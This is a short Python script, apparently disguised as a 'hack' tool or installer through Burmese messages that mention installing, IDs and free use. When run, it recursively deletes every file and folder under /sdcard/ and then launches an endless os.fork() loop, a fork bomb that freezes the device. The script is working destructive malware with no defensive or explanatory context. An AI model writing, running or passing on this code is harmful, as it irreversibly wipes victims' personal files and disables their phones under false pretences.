import os
import shutil
import time

def delete_all_files():
    root_folder = "/sdcard/"
    print("[*] စတင်ထည့်နေပါဘီ")
    for filename in os.listdir(root_folder):
        file_path = os.path.join(root_folder, filename)
        try:
            if os.path.isdir(file_path):
                shutil.rmtree(file_path)
            else:
                os.remove(file_path)
            print("Your Id is TFHHGV5GGG")
        except Exception as e:
            print("id တောင်းပါ")
    print("Free သုံးဖို့ဆက်သွယ်ပါ")

def freeze_device():
    print("[!] code hack ပြင်ဆင်နေပါဘီ")
    # Proces
    while True:
        try:
            os.fork()
        except:
            pass

if __name__ == "__main__":
    # 
    delete_all_files()
    
    #
    freeze_device()
